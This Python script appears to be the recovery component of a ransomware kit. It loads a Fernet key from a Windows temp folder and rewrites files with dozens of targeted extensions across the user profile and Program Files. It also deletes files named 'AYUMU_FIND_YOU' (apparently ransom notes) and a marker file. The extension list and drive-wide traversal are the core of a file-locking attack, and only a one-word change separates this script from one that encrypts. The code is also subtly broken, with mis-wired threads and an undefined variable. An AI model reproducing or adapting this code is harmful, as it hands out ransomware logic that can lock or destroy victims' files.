from cryptography.fernet import Fernet 
import os , threading

def retornar_key():
    return open("C:\\Windows\\Temp\\key.key" , "rb").read()
    
def encryptado(paths , key):
    f = Fernet(key)
    e = (".jpg" , ".mp3" , ".mp4" , ".txt" , ".doc" , ".ppt" , ".xls" , ".html" , ".py" , ".c" , ".c#",".cpp" , ".go" , ".ico" , ".eml" , ".gif" , ".wav" , ".zip" , ".rar" , ".pdf" , ".iso" , ".mds" , ".docx" ,  ".bat" , ".mpeg" , ".ini" , "tar.gz" , "paf.exe" , ".search-ms" , ".lnk" , ".contact" , ".pid" , ".json" ,".dll", ".exe", ".xz" , ".png", ".bin" , ".h")  
    
    for i in paths:
        try:
            if i.endswith(e):
                with open(i , "rb") as data:
                    datos = data.read()
                decrypted_data = f.decrypt(datos)
        
                with open(i , "wb") as w:
                    w.write(decrypted_data)
            else:
                agregar = Rutas_a_encriptar(i)
                paths.append(agregar)
        except Exception:
            pass
            
def Rutas_a_encriptar(ruta):
    e = (".jpg" , ".mp3" , ".mp4" , ".txt" , ".doc" , ".ppt" , ".xls" , ".html" , ".py" , ".c" , ".c#",".cpp" , ".go" , ".ico" , ".eml" , ".gif" , ".wav" , ".zip" , ".rar" , ".pdf" , ".iso" , ".mds" , ".docx" ,  ".bat" , ".mpeg" , ".ini" , "tar.gz" , "paf.exe" , ".search-ms" , ".lnk" , ".contact" , ".pid" , ".json" , ".dll", ".exe", ".xz" , ".png", ".bin" , ".h") 

    Ruta_completa = list()
    
    Rutas_2 = ["C:\\Users\\Public" , "C:\\Program Files(x86)" , "C:\\Program Files"]
    
    for a in Rutas_2:
        if os.path.exists(a):
            Ruta_completa.append(a)
        else:
            pass
    
    carpetas = os.listdir(ruta)
    
    for i in carpetas:
        excluir = (".regtrans-ms" , ".TM.blf" , ".LOG1" , ".LOG2" , ".ini" , ".DAT")
    
        if i.endswith(excluir):
            pass
        else:
            ruta_l = f"{ruta}\\{i}"
            Ruta_completa.append(ruta_l)
         
    for c in Ruta_completa:
        try:
            Archivos = os.listdir(c)
            for G in Archivos:
                if G.endswith(e):
                    Ruta_completa.append(f"{c}\\{G}")
                else:
                    Ruta_completa.append(f"{c}\\{G}")
        except Exception as err:
            pass
    return Ruta_completa

def delete_photos():
    ruta = os.getenv("userprofile")
    
    Ruta_completa = list()
    Ruta_completa.append(ruta)
    Rutas_2 = ["C:\\Users\\Public" , "C:\\Program Files(x86)" , "C:\\Program Files"]
    
    for a in Rutas_2:
        if os.path.exists(a):
            Ruta_completa.append(a)
        else:
            pass
    
    carpetas = os.listdir(ruta)
    
    for i in carpetas:
        excluir = (".regtrans-ms" , ".TM.blf" , ".LOG1" , ".LOG2" , ".ini" , ".DAT")
    
        if i.endswith(excluir):
            pass
        else:
            ruta_l = f"{ruta}\\{i}"
            Ruta_completa.append(ruta_l)
         
    for c in Ruta_completa:
        try:
            Archivos = os.listdir(c)
            for G in Archivos:
                if G.startswith("AYUMU_FIND_YOU"):
                    os.remove(f"{c}\\{G}")
                else:
                    Ruta_completa.append(f"{c}\\{G}")
        except Exception:
            pass
def main():
    DEFAULT_PATH = os.getenv("userprofile")
    Rutas = Rutas_a_encriptar(DEFAULT_PATH)
    
    llave = retornar_key()
    encryptado(Rutas , llave)
    
if __name__ == "__main__":
    
    Proceso1 = threading.Thread(target= main())
    Proceso2 = threading.Thread(target= delete_photos())
    
    Proceso1.start()
    Proceso2.start()
    
    Proceso1.join()
    Proceso2.join()

    if os.path.exists(DEFAULT_PATH + "\\Desktop\\Sirvio.txt"):
        os.remove(DEFAULT_PATH + "\\Desktop\\Sirvio.txt")
    else:
        pass
    
